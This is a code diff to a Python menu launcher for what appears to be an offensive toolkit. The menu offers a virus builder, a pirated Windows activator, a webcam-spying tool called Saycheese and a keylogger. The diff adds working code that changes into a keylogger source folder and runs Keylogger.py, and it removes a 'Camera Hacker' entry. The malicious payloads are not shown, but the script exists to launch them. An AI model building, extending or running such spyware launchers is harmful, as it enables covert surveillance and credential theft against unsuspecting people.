@@ -47,9 +47,8 @@ try:
         cprint('3: Sars-coV Virus Builder.', 'yellow')
         cprint('4: Pyrated Windows Activator.', 'yellow')
         cprint('5: Saycheese Spy.', 'yellow')
-        cprint('6: Camera Hacker.', 'yellow')
-        cprint('7: KeyLogger.', 'yellow')
-        cprint('8: Exit the software.', 'yellow')
+        cprint('6: KeyLogger.', 'yellow')
+        cprint('7: Exit the software.', 'yellow')
 
         choice = int(input('Enter your choice:'))
 
@@ -102,12 +101,10 @@ try:
                 os.chdir('saycheese')
                 os.system('bash saycheese.sh')
                 os.chdir(current_working_directory)
-            except OSError:
-                os.system('clear')
-                os.system('python3')
+                break
             except ImportError:
                 importError()
-            else:
+            finally:
                 print()
                 cprint(
                     '------------------------------------------------------------------------------------------------------------------------------------------------------------',
@@ -134,7 +131,12 @@ try:
 
         elif choice == 6:
             try:
-                pass
+                os.system('cls')
+                current_working_directory=os.getcwd()
+                os.chdir('Keylogger')
+                os.chdir('Keylogger_Source_Code')
+                os.system('python Keylogger.py')
+                os.chdir(current_working_directory)
             except OSError:
                 os.system('clear')
                 os.system('python3 ')
@@ -142,15 +144,6 @@ try:
                 importError()
 
         elif choice == 7:
-            try:
-                pass
-            except OSError:
-                os.system('clear')
-                os.system('python3')
-            except ImportError:
-                importError()
-
-        elif choice == 8:
             exit()
 
 except ValueError:
